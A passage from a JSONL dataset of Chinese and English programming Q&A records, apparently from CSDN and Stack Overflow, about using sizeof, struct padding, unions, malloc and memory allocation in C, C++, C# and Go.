24\n    fmt.Println(unsafe.Sizeof(A{}))\n\n    // output 16\n    fmt.Println(unsafe.Sizeof(B{}))\n\n    // output 0\n    fmt.Println(unsafe.Sizeof(C{}))\n}\n", "\n\n", "\n", "Struct ", "A", " and ", "B", " have the same fields, but if specified in different order they result in different size. why?", "\n", "Size of struct ", "C", " is zero. How much memory is allocated by the system for ", "a := C{}", "?", "\n", "\n", "Thanks.", "\n    "]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;\\t是TAB键&amp;#xff0c;当然算长度了&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于#c语言#的问题：第四问sizeof求长度", ["第四问", "sizeof求长度，答案是B 7.解释一下", "不知道\\t算不算，", "img](", "https://img-mid.csdnimg.cn/release/static/image/mid/ask/489803229726114.png", ")"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;sizeof计算一个变量在内存中占用的字节数&amp;#xff0c;C语言中int占用4字节&amp;#xff0c;char占用一个字节。&lt;br /&gt;Union是联合体&amp;#xff0c;表示a和b共用一段内存空间&amp;#xff0c;当通过联合体调用a时&amp;#xff0c;将字节解释为int&amp;#xff0c;否则解释为char数组。&lt;br /&gt;65&amp;lt;2^8&amp;#xff0c;所以65只占用了int空间的一个字节&amp;#xff0c;剩下3个字节为空&lt;br /&gt;一般来说机器都是小端法储存数字&amp;#xff0c;即低位字节存在前面&amp;#xff08;低地址&amp;#xff09;&amp;#xff0c;高位字节存在后面&amp;#xff08;高地址&amp;#xff09;所以c的内存空间如下&lt;br /&gt;|地址|&amp;amp;c|&amp;amp;c&amp;#43;1|&amp;amp;c&amp;#43;2|&amp;amp;c&amp;#43;3|&lt;br /&gt;|数据|65|0|0|0|&lt;br /&gt;而union声明会让数组b的第一个元素是&amp;amp;c处的元素&amp;#xff0c;第二个元素是&amp;amp;c&amp;#43;1处的元素。所以puts(c.b)相当于在打印数组[&amp;#39;\\65&amp;#39;,&amp;#39;\\0&amp;#39;]&amp;#xff0c;而A的ASCII码是65&amp;#xff0c;所以会打印出A&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["sizeof(c)是什么意思啊 怎么算出来的A", ["结果是A", "#include <stdio.h>", "int main()", "\n", "{", "\n", "union { int a; char b[2];} c;", "\n", "c.a=65;", "\n", "puts(c.b); printf(\"%d\\n\",sizef(c));", "return 0;", "\n", "}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;这里的ar代表的是指针&amp;#xff0c;sizeof(ar)是8&amp;#xff0c;sizeof(*ar)是4&lt;br /&gt;整型和浮点型数组没有结束符&amp;#xff0c;也不能使用&amp;#39;\\0&amp;#39;来判断结束&amp;#xff0c;所以需要严格控制个数&amp;#xff0c;你需要将数组的个数传给max函数&lt;br /&gt;代码修改参考如下&amp;#xff1a;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c\"&gt;&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;max&lt;/span&gt;(&lt;span class=\"hljs-params\"&gt;&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; *ar, &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; n&lt;/span&gt;)&lt;/span&gt; {\n    &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;, j &amp;#61; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (j &amp;lt; n) {\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (*(ar &amp;#43; i) &amp;lt; *(ar &amp;#43; j)) {\n            i &amp;#61; j;\n        }\n        j&amp;#43;&amp;#43;;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; *(ar &amp;#43; i);\n}\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;(&lt;span class=\"hljs-params\"&gt;&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; argc, &lt;span class=\"hljs-keyword\"&gt;const&lt;/span&gt; &lt;span class=\"hljs-built_in\"&gt;char&lt;/span&gt; * argv[]&lt;/span&gt;)&lt;/span&gt; {\n    &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; x;\n    x &amp;#61; max((&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt;[]){&lt;!-- --&gt;&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;2&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;3&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;4&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;5&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;6&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;7&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;8&lt;/span&gt;}, &lt;span class=\"hljs-keyword\"&gt;sizeof&lt;/span&gt;((&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt;[]){&lt;!-- --&gt;&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;2&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;3&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;4&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;5&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;6&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;7&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;8&lt;/span&gt;})/&lt;span class=\"hljs-keyword\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt;));\n    printf(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d\\n&amp;#34;&lt;/span&gt;, x);\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["使用sizeof对数组计算元素个数", ["问题遇到的现象和发生背景", "\n", "为啥我这里用sizeof算ar的元素个数不对呢", "\n", "问题相关代码，请勿粘贴截图", "\n", "#include<stdio.h>", "int max(int ar[]);", "\n", "int main() {", "    int x;", "    x=max((int[]) {4,8,9,5,6,7,11,3});", "\n", "printf", "(", "\"数组中的最大值是%d\\n\"", ", ", "x", ");\n\n", "return", " ", "0", ";\n", "\n", "}", "\n", "int max(int *ar) {", "    int i=0, j=1;", "    printf(\"%d\\n\",sizeof(ar)/sizeof(*ar));", "    while (j<=sizeof(ar)/sizeof(", "ar)) {", "        if (", "(ar + i) < *(ar + j)) {", "            i = j;", "        }", "        j++;", "    }", "\n", "return", " *(ar + i);\n", "\n", "}", "\n", "运行结果及报错内容", "\n", "\n", "我的解答思路和尝试过的方法", "\n", "这里稍微测试了一下，发现这个sizeof（ar）只有4的大小，估计是去计算sizeof（&ar[0]）了。", "想知道为啥这里会错，是因为这里使用了复合字面量没有真正创建一个数组么", "\n", "我想要达到的结果"]], "Tag": "程序设计"}
{"Answer": "答案是C\r\n\r\n\r\n\r\n```\r\n char *pArray[] = {\"How\",\"are\",\"you\"};\r\n```\r\n\r\n定义了一个数组，数组元素的数据类型是char*\r\n\r\n\r\n所以计算数组大小的时候，应该除以sizeof(char*)，而不是sizeof(char)。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["妹子求大神指教，谢谢！", ["单选(1分)", "\n下面程序希望得到的运行结果如下：", "\nTotal string numbers = 3", "\nHow are you", "\n但是现在代码存在错误，找出下面选项中修改正确的语句", "\n#include ", "\nvoid  Print(char *arr[], int len);  ", "\nint main()", "\n{", "\n    char *pArray[] = {\"How\",\"are\",\"you\"};", "\n    int   num = sizeof(pArray) / sizeof(char);  ", "\n    printf(\"Total string numbers = %d\\n\", num); ", "\n    Print(pArray, num);", "\n    return 0;", "\n}", "\n ", "\nvoid  Print(char *arr[], int len)", "\n{", "\n    int  i;    ", "\n    for (i=0; i<len; i++)", "\n    {", "\n        printf(\"%s \", arr[i]);", "\n    }", "\n    printf(\"\\n\");", "\n}", "\n得分/总分", "\n\n", "A.", "\n第5行应该是：  char pArray[] = {\"How\",\"are\",\"you\"};", "\n\n", "B.", "\n第6行应该是：  int   num = sizeof(pArray/char *);  ", "\n\n", "C.", "\n第6行应该是：  int   num = sizeof(pArray) / sizeof(char*);", "\n\n", "D.", "\n第12行应该是：  void  Print(char arr[], int len)"]], "Tag": "程序设计"}
{"Answer": "NET_CTRL_SET_BYPASS stuSetBypass = new NET_CTRL_SET_BYPASS(sizeof(NET_CTRL_SET_BYPASS));\r\n看看呢", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C++中结构体 A = {sizeof(A)}如何在C#中定义？", ["C++中是这样定义的 NET_CTRL_SET_BYPASS stuSetBypass = {sizeof(stuSetBypass)};我想在C#中定义，如：", "\n\n", "NET_CTRL_SET_BYPASS stuSetBypass = new NET_CTRL_SET_BYPASS(sizeof(**stuSetBypas**));\n", "\n\n", "这是我自己在C#中定义的，但是出错。错误提示：未能找到类型或命名空间名称\"stuSetBypass\"(是否缺少指令或程序集引用) 。粗体就是错误来源。", "\n求大神解答下。"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;p是一个指针&amp;#xff0c;sizeof&amp;#xff08;p&amp;#xff09;就是计算指针所占的字节数&amp;#xff0c;又因为题目给定了指针变量所占的字节数是2&amp;#xff0c;所以c为2&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["这个题是咋做的呀，可以解释一下吗", ["设指针变量占2个字节的内存空间,若有声明\"char *p=\"123\";int c;\",则执行语句\"c=sizeof(p);\"后,c的值为()."]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;From the &lt;a href=\"http://www.open-std.org/JTC1/sc22/wg14/www/docs/n1256.pdf\" rel=\"noreferrer\"&gt;C99 Standard&lt;/a&gt; (the emphasis is mine)&lt;/p&gt;\n\n&lt;blockquote&gt;\n  &lt;p&gt;6.5.3.4/2&lt;/p&gt;\n  \n  &lt;p&gt;The sizeof operator yields the size (in bytes) of its operand, which may be an expression or the parenthesized name of a type. The size is determined from the type of the operand. The result is an integer. If the type of the operand is a variable length array type, the operand is evaluated; otherwise, &lt;strong&gt;the operand is not evaluated&lt;/strong&gt; and the result is an integer constant.&lt;/p&gt;\n&lt;/blockquote&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么 sizeof (x + +)不增加 x？", ["\n\n", "Here is the code compiled in dev c++ windows:", "\n\n", "#include <stdio.h>\n\nint main() {\n    int x = 5;\n    printf(\"%d and \", sizeof(x++)); // note 1\n    printf(\"%d\\n\", x); // note 2\n    return 0;\n}\n", "\n\n", "I expect ", "x", " to be 6 after executing ", "note 1", ". However, the output is:", "\n\n", "4 and 5\n", "\n\n", "Can anyone explain why ", "x", " does not increment after ", "note 1", "?", "\n    ", "\n\n", "转载于:https://stackoverflow.com/questions/8225776/why-does-sizeofx-not-increment-x"]], "Tag": "程序设计"}
{"Answer": "一个是在栈里面分配一个 elemtype 内存单元，数据为NULL，一个是在堆里面分配elemtype大小的内存单元，返回这段内存的头指针。在栈里面分配的，不用自己回收，在堆里面分配的必须自己回收。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["内存管理和动态分配内存", ["请问ElemType ", "p = NULL和ElemType *p = (ElemType", ")mallco(sizeof(ElemType))有区别吗？"]], "Tag": "程序设计"}
{"Answer": "一个是L节点\r\n一个是L的next\r\n\r\n等同于 L是所分配的内存块的名字？在L上操作等同于在所分配的内存块上操作\r\n这么理解没问题，但是一般来说“名字”科学的说法叫做指针变量。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于动态内存分配问题 求大佬解答", ["struct LNode\n{\nint date;\nstruct LNode * next;\n}\n", "\n\n", "struct LNode *L;", "\n\n", "请问", "\nL = （LNode*）malloc(sizeof(LNode));", "\n\n", "L.next = (LNode*) malloc(sizeof(LNode));", "\n\n", "请问这两句话有区别吗，第一句话是不是等同于  L是所分配的内存块的名字？在L上操作等同于在所分配的内存块上操作？"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;strlen 测量的是字符的实际长度&amp;#xff0c;以&amp;#39;\\0&amp;#39; 结束&amp;#xff08;不包含&amp;#39;\\0&amp;#39; &amp;#xff09;。而sizeof 测量的是字符的分配大小&amp;#xff0c;如果未分配大小&amp;#xff0c;则遇到&amp;#39;\\0&amp;#39; 结束&amp;#xff08;包含&amp;#39;\\0&amp;#39; &amp;#xff0c;也就是strlen测量的长度加1&amp;#xff09;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于#c语言#的问题：strcpy函数的用法，图上的才做用malloc动态内存分配的部分可以替换成sizeof吗", ["在学strcpy函数的用法，图上的malloc动态内存分配的部分可以替换成sizeof吗？", "\n"]], "Tag": "程序设计"}
{"Answer": "其实并行多重循环这么写肯定是有问题的，内部循环变量j是共享的，被多个线程同时修改，那么就很有可能超出Njuncs，发生内存越界写入，**切记循环内的变量写入是并行的**。\r\n应该把 j 声明为并行体中私有的，这样结果就正确了，参考如下代码：\r\n\r\n```\r\n#include &lt;cstdlib&gt;\r\n\r\nint main(int argc, char* argv[]) {\r\n    int i, j, Njuncs = 1827;\r\n    //创建二维数组A\r\n    double** A = (double**)malloc(sizeof(double*) * (Njuncs + 1));\r\n    for (i = 0; i &lt; Njuncs + 1; i++)\r\n        *(A + i) = (double*)malloc(sizeof(double) * (Njuncs + 1));\r\n\r\n#pragma omp parallel\r\n    {\r\n#pragma omp for private(j)\r\n        for (i = 0; i &lt;= Njuncs; i++)\r\n            for (j = 0; j &lt;= Njuncs; j++) {\r\n                A[i][j] = 1;\r\n            }\r\n    }\r\n\r\n#pragma omp parallel for\r\n    for (i = 0; i &lt; Njuncs + 1; i++) {\r\n        free(*(A + i));//该步报错\r\n        A[i] = NULL;\r\n    }\r\n    free(A);\r\n\r\n    return 0;\r\n}\r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["OpenMP 并行堆内存释放问题", ["malloc函数声明一个二维动态数组A，使用omp并行对A赋值，然后释放A内存时报错。在不使用并行时，不会报错。谢谢！代码如下：", "\nvoid main(){", "\n\n", "void main(){\n\n    int i,j, Njuncs=1827;\n    //创建二维数组A\n    double**A = (double **)malloc(sizeof(double *)*(Njuncs + 1)); \n    for (i = 0; i < Njuncs + 1; i++)\n        *(A + i) = (double  *)malloc(sizeof(double) * (Njuncs + 1)); \n\n#pragma omp parallel\n    {\n#pragma omp for\n        for (i = 0; i <= Njuncs; i++)\n            for (j = 0; j <= Njuncs; j++)\n                A[i][j] = 1;\n    }\n    for (i = 0; i < Njuncs + 1; i++){\n        free(*(A + i));//该步报错\n        A[i] = NULL;\n    }\n    free(A);\n}\n"]], "Tag": "程序设计"}
{"Answer": "自己刚才试了在循环末尾加上Marshal.DestroyStructure可以释放\r\n用Marshal.FreeHGlobal(pt)可能没有释放内部结构体，不能解决问题", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["释放intptr内存资源，是不是应该对内存清零？再次用这块内存的时候会返回上一次的数据", ["C#调用C++的dll时候用到的类", "\n\n", "                public struct DBCSignal\n    { \n             ...\n        public Byte multiplexer_value;\n\n        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 11)]\n        public Byte[] unit;\n\n\n        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 128)]\n        public Byte[] strName;\n\n        //[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 201)]\n        public Byte[] strComment;\n\n\n        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 128)]\n        public Byte[] strValDesc;\n    }\n        public struct DBCMessage\n    {\n                public UInt32 nSize;   \n\n        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 128)]\n        public DBCSignal[] vSignals; \n\n        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 128)]\n        public byte[] strName;\n\n        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 201)]\n        public byte[] strComment;\n    }\n", "\n\n", "结构体传递的时候用到intptr指针", "\n\n", " IntPtr pt = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(DBCMessage)));\nif (DBC_GetFirstMessage(m_hDBC,pt))\n            {\n                DBCMessage msg = (DBCMessage)Marshal.PtrToStructure(pt, typeof(DBCMessage));\n                m_vMsg.Add(msg);\n                                Marshal.FreeHGlobal(pt);//释放内存\n                                while (DBC_GetNextMessage(m_hDBC,pt))\n                {          \n                    msg = (DBCMessage)Marshal.PtrToStructure(pt, typeof(DBCMessage));\n                                        this.dataGridView1.Rows[index1].Cells[9].Value = Regex.Replace(System.Text.Encoding.Default.GetString(msg.strComment), @\"\\0\", string.Empty);\n                                        //怀疑再次用Marshal.PtrToStructure会把上一次的数据传给msg\n                                }\n", "\n\n", "在循环的时候Marshal.PtrToStructure为什么会把上一次循环的数据又传给msg呢？能不能把pt所指内存清零呢？"]], "Tag": "程序设计"}
{"Answer": "你看一下\r\nsizeof(Small)  \r\nsizeof(Big)  \r\n就应该知道为什么不对了。\r\nsizeof(Big)的大小可不是你预期的大小\r\n4*sizeof(int) + sizeof(int)*4 + 4*20*sizeof(Small)\r\n而是\r\n4*sizeof(int) + sizeof(int)*4 + 4*20*sizeof(Small*)\r\n\r\nsizeof(Small) = sizeof(int32) + sizeof(int64)*2 （在不考虑机器字节对齐的情况下）\r\n而sizeof(Small*) = sizeof(void*)\r\n就是机器指针长度一般为  4\r\n\r\nbig-&gt;small[0][0]相当于初始化的一个指针变量 默认初始化为0\r\n所有big-&gt;small[X][X] 都被赋值为0\r\n除非你申请个堆空间给他赋值\r\n后面这个句子就不会段错误\r\nmemcpy(big-&gt;small[2][10],&amp;small,sizeof(Small));\r\n\r\n还有比较简单的改法就是结构体Big定义的时候把Small *  的这个* 去掉\r\n\r\n变为\r\ntypedef struct {\r\n  int index[4];\r\n  int small_count[4];\r\n  Small  small[4][20];\r\n}Big;\r\n即可符合你的预期", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言申请共享内存失败", ["需求：", "\n1:有一块共享内存，分为四个缓存区，2:每一个缓存区又是一个数组，3:每一个数组里面存放着结构体指针", "\n如图", "\n\n", "遇到的问题：不能成功申请内存", "\n\n", "希望高手指点一下迷津", "\n\n", "代码如下：", "\n\n", "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <sys/ipc.h>\n#include <sys/shm.h>\ntypedef struct {\n  int32_t a;\n  int64_t b;\n  int64_t c;\n}Small;\n\ntypedef struct {\n  int index[4];\n  int small_count[4];\n  Small *small[4][20];\n}Big;\nint main(){\n  Big *big = NULL;\n  int shm_id = shmget((key_t)12345,sizeof(Big),0666 | IPC_CREAT);\n  if(shm_id < 0){\n    printf(\"get shm_id error\\n\");\n    return -1;\n  }\n  void *shm_pointer = shmat(shm_id,(void*)0,0);\n  if(shm_pointer == NULL){\n    printf(\"shmmat error\\n\");\n    return -1;\n  }\n  big = (Big*)shm_pointer;\n  printf(\"big=%p\\n\",big);\n  printf(\"big->small[0]=%p\\n\",big->small[0]);\n  printf(\"big->small[0][0]=%p\\n\",big->small[0][0]);\n\n  //next step: I want to memcpy data to the shared_memory\n  Small small;\n  small.a = 1;\n  small.b = 1;\n  small.c = 1;\n  memcpy(big->small[2][10],&small,sizeof(Small));\n  return 0;\n}\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;sort中参数只会认为是一个int *而已 。你需要参数增加数组长度才行&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于用sizeof求数组长度的问题", ["#include<iostream>", "\n", "using", " ", "namespace", " ", "std", ";\n\n", "void", " ", "sort", "(", "int", " arr[]", ")", "\n{\n    cout << ", "sizeof", "(arr) / ", "sizeof", "(arr[", "0", "]) << endl;\n}\n\n", "int", " ", "main", "(", ")", "\n{\n    ", "int", " a[] = { ", "3", ", ", "5", ", ", "4", ", ", "2", ", ", "8", ", ", "7", ", ", "9", " };\n    sort(a);\n    cout << ", "sizeof", "(a) / ", "sizeof", "(a[", "0", "]) << endl;\n\n    system(", "\"pause\"", ");\n    ", "return", " ", "0", ";\n}\n", "\n", "上述代码输入：7    1", "请问为什么在main函数中可以通过sizeof方式正确的得到数组的长度，而在sort函数中却不能正确的得到数组的长度？"]], "Tag": "程序设计"}
{"Answer": "memcpy(buf, 拷贝的原始数组, sizeof(char)*msg_size);", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于memcpy();的问题，希望大家帮帮我", ["unsigned short msg_size=21；", "\nchar buf[MAX] = {0};", "\nmemcpy(buf, &msg_size, sizeof(msg_size));", "\n有什么问题吗，我找不到问题所在"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;There's nothing whatsoever in your code that &lt;em&gt;requires&lt;/em&gt; memory. The compiler is perfectly within its rights to optimize the whole allocation away, and even if the compiler doesn't do it, the OS will not &lt;em&gt;commit&lt;/em&gt; the memory - you're never assigning anything, so it's likely just mirroring a zero-page.&lt;/p&gt;\n\n&lt;p&gt;I don't know anything about the subtle differences between whatever Linux you're using and whatever MacOS you're using, so there's little that can be said with certainty. It might very well be that your way of checking memory on your linux machine gives you only committed memory, while you're seeing all virtual memory on your MacOS, or there might be other subtle differences. In any case, since compilers became smart and since we had virtual memory on PCs, it's been getting harder and harder to get any meaningful benchmarks - the tools we work with are usually smart enough to avoid unnecessary waste; and most benchmarks you'll try are pretty much completely unnecessary waste.&lt;/p&gt;\n\n&lt;p&gt;Benchmarking is hard.&lt;/p&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["Golang内存分配测试", ["\n\n", "I'm trying to allocate memory with my \"program\" - just to allocate it and stay there - for testing purposes. When I run it on my MacOS the Activity Monitor shows it allocates 1.6 gb, when I compile it for linux and run it there it does nothing - it prints the message but the ram isn't being used on the machine. Am I doing it wrong? Is there a better way? Here is my code:", "\n\n", "package main\n\n\nimport (\n    \"fmt\"\n    \"unsafe\"\n    \"time\"\n)\n\n\nfunc main() {\n    var buffer [100 * 1024 * 1024]string\n    fmt.Printf(\"The size of the buffer is: %d bytes\n\", unsafe.Sizeof(buffer))\n    time.Sleep(300 * time.Second)\n}\n", "\n\n", "First I used byte for my array type, but it did not worked event on my mac? ", "\n    "]], "Tag": "程序设计"}
{"Answer": "&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;T &amp;#61; (&lt;span class=\"hljs-keyword\"&gt;bitnode*)malloc(sizeof(bitnode)); &lt;/span&gt;分配了 sizeof(&lt;span class=\"hljs-keyword\"&gt;bitnode) &lt;/span&gt;大小的内存&amp;#xff0c;但是它的 struct element *data&lt;span class=\"hljs-comment\"&gt;;并没有分配内存&amp;#xff0c;&lt;/span&gt;\n\n\ntypedef struct &lt;span class=\"hljs-keyword\"&gt;bitnode\n&lt;/span&gt;{\nstruct element data&lt;span class=\"hljs-comment\"&gt;; //不是指针则调用方式是T-&amp;gt;data.N &amp;#61; c;&lt;/span&gt;\n&lt;span class=\"hljs-keyword\"&gt;bitnode &lt;/span&gt;lchild, * rchild;\n}&lt;span class=\"hljs-keyword\"&gt;bitnode, &lt;/span&gt;* &lt;span class=\"hljs-keyword\"&gt;bitTree;\n&lt;/span&gt;\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c++编写放大器时赋值报错", ["c++编写放大器，将结点值放入N的时候报错", "typedef struct element", "{", "    char N;", "    int D;", "    int d;", "    bool boost;", "}element;", "//定义二叉树", "typedef  struct bitnode", "{", "    struct element ", "data;", "    bitnode", " lchild, * rchild;", "}bitnode, * bitTree;", "\n", "//创建二叉树", "void createbitTree(bitTree &T)", "{", "    char c;", "    int a;", "    c = getchar();", "    if (c == '#')T = nullptr;", "    else", "    {", "        scanf_s(\"%d\", &a);", "        T = (bitnode*)malloc(sizeof(bitnode));", "        if(T ==nullptr)exit(-1);", "        T->data->N = c;", "        T->data->d = a;", "        T->data->boost = false;", "        T->data->D = 0;", "        T->lchild = T->rchild = nullptr;", "        createbitTree(T->lchild);", "        createbitTree(T->rchild);", "    }", "\n", "}", "\n", "\n", "请大家帮帮忙到底哪里有问题"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;string不能用sizeof计算长度。string是个类&amp;#xff0c;相当于一个动态的字符数组&amp;#xff0c;需要用它自身的函数来获得当前的长度&lt;br /&gt;这个40应该是string类中各个成员变量的长度之和&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c++里string的sizeof", ["刚接触string，个人理解是一个系统自动调节大小的字符数组。但是无论string中存储多长的字符串，用sizeof结果都是40。可如果下标超过字符串长度，又报错越界。", "所以sizeof的这个40到底代表什么？string在程序运行时如何被分配内存的？程序如何根据输入调节数组长度的？", "请各位多多指教，谢谢！"]], "Tag": "程序设计"}
{"Answer": "系统默认为8字节对齐，所以是8+8+8+16＝40", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["这个结构体的大小怎么计算？", ["typedef struct my", "\n{", "\n            struct my *n;", "\n            struct my *p;", "\n            long value;", "\n            unsigned char a[16];", "\n}m;", "\nsizeof (m) = ?"]], "Tag": "程序设计"}
{"Answer": "二维数组在内存中其实是一个平坦的一维数组，下面具体说明：\r\nint arr[3][5] 和 int arr[15] 所使用的内存区大小是一样的，都是15*sizeof(int)个字节。\r\n如果你做下面这样一个定义：\r\nunion{\r\n   int a[3][5];\r\n   int b[15];\r\n\r\n}U;\r\n\r\n你会发现\r\nU.a = &amp;U.b\r\nU.a[0] == &amp;U.b[0]\r\nU.a[1] == &amp;U.b[5]\r\nU.a[2] == &amp;U.b[10]\r\n&amp;U.a[2][3] == &amp;U.b[13]\r\n\r\n规律是： &amp;U.a[m][n] == &amp;U.b[m*5+n]，其中5就是数组a的第二维度。\r\n实际上，二维数组在运行时也是用这样的公式转化为对一维数组的访问。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言二维数组内存是怎么分配的？", ["为什么这段代码的执行结果是这样？", "\n\n", "    int (*a)[2];\n    int b[2][2];    \n    printf(\"size of first element of b is %d\\n\",sizeof(b[0][0])) ;\n    a = b;\n    printf(\"size of first element of a is %d\",sizeof(a[0][0])) ;\n", "\n\n", "size of first element of b is 4", "\nsize of first element of a is 40"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;sizeof()的返回值是long unsigned int。这样定义的原因是任何一个变量的size不可能是负数&amp;#xff0c;所以用unsigned扩充数据范围。&lt;/p&gt;\n\n&lt;p&gt;想要修改这个bug&amp;#xff0c;只需要这样做&amp;#xff1a;&lt;/p&gt;\n\n&lt;pre&gt;\n&lt;code class=\"language-cpp\"&gt;#include&amp;lt;stdio.h&amp;gt;\n#include&amp;lt;string.h&amp;gt;\nint main(int argc,char **argv)\n{\n        int array4[3][4];\n        memset(array4,-1,sizeof(array4));\n        printf(&amp;#34;array4[2][3]:%d,sizeof(array4):%d\\n&amp;#34;,array4[2][3],(int)sizeof(array4));\n \n        return 0;\n \n}&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt; &lt;/p&gt;\n\n&lt;p&gt;添加一个(int)强制类型转换即可。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于用memset初始化一个二维数组后用printf输出元素，gcc出现warning的问题", ["大神们好，小白问题如题所示TT", "\n\n", "本人定义了一个3行4列的二维数组，然后用memset初始化-1，代码如下：", "\n\n", "\n", "#include<stdio.h>\n#include<string.h>\nint main(int argc,char **argv)\n{\n        int array4[3][4];\n        memset(array4,-1,sizeof(array4));\n        printf(\"array4[2][3]:%d,sizeof(array4):%d\\n\",array4[2][3],sizeof(array4));\n\n        return 0;\n\n}\n", "\n\n", "gcc显示了警告TT(运行结果还是对的。。):", "\n\n", "为什么？！哪里来的long unsigned int？！", "\n\n", "望大神们赐教，感激不尽TT"]], "Tag": "程序设计"}
{"Answer": "```\r\n#include&lt;stdio.h&gt;\r\n\r\ntypedef struct tnode Tnode;\r\nstruct tnode\r\n{\r\n\tTnode *left;\r\n\tTnode *right;\r\n\tint data;\r\n};\r\nTnode *new_tnode(int data)\r\n{\r\n\t//不能用new定义变量，是保留字\r\n\tTnode *node = (Tnode* )malloc(sizeof(Tnode));\r\n\tnode-&gt;left=NULL;\r\n\tnode-&gt;right=NULL;\r\n\tnode-&gt;data=data;\r\n\treturn node;\r\n}\r\nvoid insert(Tnode *root,Tnode *node)\r\n{\r\n    if(root == NULL)\r\n    {\r\n        root = node;\r\n        return;\r\n    }\r\n    if(node-&gt;data &lt; root-&gt;data )\r\n    {\r\n        if(root-&gt;left == NULL){\r\n            root-&gt;left = node;\r\n        }else{\r\n            insert(root-&gt;left,node);\r\n        }\r\n    }\r\n    else if(node-&gt;data &gt; root-&gt;data )\r\n    {\r\n        if(root-&gt;right == NULL){\r\n            root-&gt;right = node;\r\n        }else{\r\n            insert(root-&gt;right,node);\r\n        }\r\n    }\r\n}\r\nvoid printout(Tnode *tree)\r\n{\r\n\tif(tree == 